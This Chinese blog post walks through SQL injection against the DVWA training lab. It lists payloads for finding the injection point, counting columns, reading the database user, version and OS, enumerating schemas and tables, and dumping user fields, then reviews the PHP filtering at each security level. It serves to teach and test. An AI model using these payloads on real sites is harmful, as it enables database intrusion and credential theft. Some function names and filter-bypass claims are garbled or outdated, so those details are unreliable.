---
title: DVWA的SQL注入测试
subtitle: 
summary: 通过使用DVWA实例理解PHP中SQL注入漏洞产生的原理及利用方法，结合实例掌握其过滤方式。
authors:
- admin
tags: ["sql","DVWA"]
categories: ["Hack"]
date: "2017-02-09T00:00:00Z"
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
image:
  caption: ""
  focal_point: ""

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---



SQL注入：在用户的输入没有被转义字符过滤时。就会发生这种形式的注入式攻击，它会传递给数据库一个SQL语句。这样就会导致应用程序的终端用户对数据库上的语句实施操纵。就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

具体来说，它是利用现有的应用出现，将（恶意）的SQL目录注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。

# 步骤

## 低安全等级文件包含

### 登陆DVWA

使用浏览器打开``,输入用户名密码登陆。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_45413)

### 调整安全级别

登陆后将DVWA的安全级别调整为low（见红框内）。调整之后选择SQL Injection，进入页面。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_48342)

### 简单的ID查询

提示输入User ID，输入正确的ID，将显示ID First name，Surname信息。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_64727)

### 检测是否存在注入

可以得知此处位注入点，尝试输入`'`，返回错误。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_58203)

### 遍历数据库表

尝试遍历数据库表，提示输入的值是ID，可以初步判断此处为数字类型的注入。尝试输入`1 or 1=1`，尝试遍历数据库表。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_24591)

可见并没有达成目的，猜测程序将此处看成了字符型，尝试输入`1' or' 1' =' 1`后遍历出了数据库中所有内容。下面尝试不同语句，得到不同的结果。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_87635)

### 查询信息列表长度

利用`order by [num]`语句来测试查询信息列表长度，修改num的值,这里我们输入`1' order by 1 --`结果页面正常显示，**注意–后面有空格**。继续测试，`1' order by 2 --`，`1' order by 3 --`，当输入3时，页面报错。页面错误信息如下：`Unknown column '3' in 'order clause'`，由此我们判断查询结果值为2列。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_15397)

### 获取数据库名称、账户名、版本及操作系统信息

通过使用`user()`，`database()`，`version()`三个内置函数得到连接数据库的账户名、数据库名称、数据库版本信息。

- 首先参数注入`1' and 1=2 union select 1,2 --`(**注意–后有空格**)。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_23692)

由上图得知，First name处显示结果位查询结果的第一列的值，surname处显示结果位查询结果第二列的值。

- 通过注入`1' and 1=2 union select user(),database() --`得到数据库用户为**root@localhost**及数据库名**dvwa**

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_62655)

- 通过注入`1' and 1=2 union select version(),database() --`得到数据库版本信息，此处数据库版本为**5.0.90-community-nt**。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_83473)

- 通过注入`1' and 1=2 union select 1,@@global.version_compile_os from mysql.user --`获得操作系统信息。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_94423)

### 查询mysql数据库所有数据库及表

通过注入`1' and 1=2 union select 1,schema_name from information_schema.schemata --`查询mysql数据库的所有数据库名。

这里利用mysql默认的数据库**information_schema**，该数据库存储了Mysql所以数据库和表的信息。如图所示

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_21763)

### 猜解表名

通过注入`1' and exists(select * from users) --`猜解dvwa数据库中的表名。

利用`1' and exists(select * from [表名])`，这里测试的结果，表名为users，在真实的渗透环境中，攻击者往往关心存储管理员用户和密码信息的表。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_36450)

### 猜解字段名

猜解字段名：`1' and exists(select [表名] from users) --`。这里测试的字段名有`first_name`,`last_name`。

通过注入`1' and exists(select first_name from users) --`和`1' and exists(select last_name from users) --`猜解字段名。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_21940)

### 爆出数据库中字段内容

注入`1' and 1=2 union select first_name,last_name from users --`，这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_94412)

## 代码分析

### low等级源代码

如图所示

![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_37330)

通过代码可以看出，对输入**$id**的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。

### 中等等级代码分析

将DVWA安全级别调整位medium，查看源代码。![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_95600)

通过源代码可以看出，在中等级别时对输入的**$id**值使用`mysql_real_eascape_string()`函数进行了处理。在PHP中，使用`mysql_real_eascape_string()`函数用来转移SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字转换一下编码格式即可绕过该防护函数。比如URL编码等方式。

同时发现SQL语句中变成了`“WHRER user_id = “$id”` ，此处变成了数字型注入，所以此处使用`mysql_real_eascape_string()`函数并没有起到防护作用。可以通过类似于`1 or 1=1`的语句来进行注入。

### 高等级代码分析

将DVWA安全级别调整为high，查看源代码。![img](http://www.shiyanbar.com/UploadImage/2016/3/7/20_75240)

从源代码可以看出，此处为字符型注入。对传入**$id**的值使用`stripslashes()`函数处理以后，再经过到`$mysql_real_escape_string()`函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行`addslashes()`,`addslashes()`函数返回在部分与定义之前添加`\`。

`Striptslashes()`函数则是删除由`addslashes()`函数添加的反斜杠。在使用两个函数进行过滤之后再使用`is_numric()`函数检查**$id**值是否位数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。


